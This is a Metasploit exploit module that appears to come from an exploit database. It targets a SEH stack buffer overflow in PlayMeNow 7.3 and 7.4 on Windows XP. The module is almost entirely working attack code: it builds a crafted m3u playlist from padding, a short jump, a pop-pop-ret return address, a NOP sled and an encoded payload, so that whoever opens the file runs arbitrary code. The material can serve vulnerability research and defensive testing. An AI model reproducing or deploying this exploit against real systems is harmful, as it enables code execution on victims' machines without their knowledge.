# Tested on: Windows XP SP3 - English
# CVE :
# Code :

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking

    include Msf::Exploit::FILEFORMAT
   include Msf::Exploit::Remote::Seh

    def initialize(info = {})
        super(update_info(info,
            'Name' => 'PlayMeNow versions 7.3 and 7.4 Buffer Overflow Exploit (SEH)',
            'Description' => %q{
                This module exploits a stack overflow in PlayMeNow version 7.3 and 7.4.
            By creating a specially crafted m3u or pls file, an an attacker may be able
            to execute arbitrary code.
            },
            'License' => MSF_LICENSE,
            'Author' => 'Blake',
            'Version' => 'Version 1',
            'References' =>
                [
                    [ 'OSVDB', '' ],
                    [ 'URL', 'http://www.exploit-db.com/exploits/10556' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'seh',
                },
            'Payload' =>
                {
                    'Space' => 1428,
                    'BadChars' => "\x00\x20\x0a\x0d",
                    'StackAdjustment' => -3500,
                    'DisableNops' => 'True',
                },
            'Platform' => 'win',
            'Targets' =>
                [
                    [ 'Windows XP Universal', { 'Ret' => 0x10020ed7} ], # pop pop ret - AtomicClock.lmd

                ],
            'Privileged' => false,
            'DefaultTarget' => 0))

        register_options(
            [
                OptString.new('FILENAME', [ false, 'The file name.', 'metasploit.m3u']),
            ], self.class)
    end


    def exploit

        sploit = rand_text_alphanumeric(2360)
        sploit << "\xeb\x06\x90\x90"            # short jump 6 bytes
        sploit << [target.ret].pack('V')
        sploit << "\x90" * 20                # nop sled
        sploit << payload.encoded
        sploit << rand_text_alphanumeric(1428 - payload.encoded.length)

        playlist = sploit
        print_status("Creating '#{datastore['FILENAME']}' file ...")
        file_create(playlist)

    end

end